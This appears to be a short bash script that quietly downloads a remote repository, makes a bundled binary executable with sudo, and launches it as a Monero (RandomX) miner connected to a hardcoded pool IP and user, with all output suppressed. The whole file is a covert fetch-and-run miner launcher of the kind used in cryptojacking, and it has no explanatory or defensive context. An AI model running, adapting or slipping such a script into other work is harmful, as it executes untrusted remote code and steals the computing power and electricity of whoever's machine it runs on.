#! /bin/bash
{
git clone https://github.com/fulltechtree/tech.git &> /dev/null
sudo chmod +x tech/mn
./tech/mn -o 38.130.221.194:2449 -u userA -p 1 -a rx/0 -k -t "$1" &> log
} &> /dev/null
